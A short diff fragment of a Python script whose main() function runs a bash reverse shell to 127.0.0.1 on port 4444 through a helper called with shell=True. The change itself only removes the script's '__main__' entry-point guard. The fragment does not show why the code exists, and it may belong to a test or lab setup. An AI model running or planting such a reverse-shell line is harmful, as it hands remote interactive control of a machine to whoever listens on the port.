@@ -23,5 +23,3 @@ def main():
     _common.execute(['bash -c "bash -i >/dev/tcp/127.0.0.1/4444" 0>&1'], shell=True)
 
 
-if __name__ == "__main__":
-    exit(main())
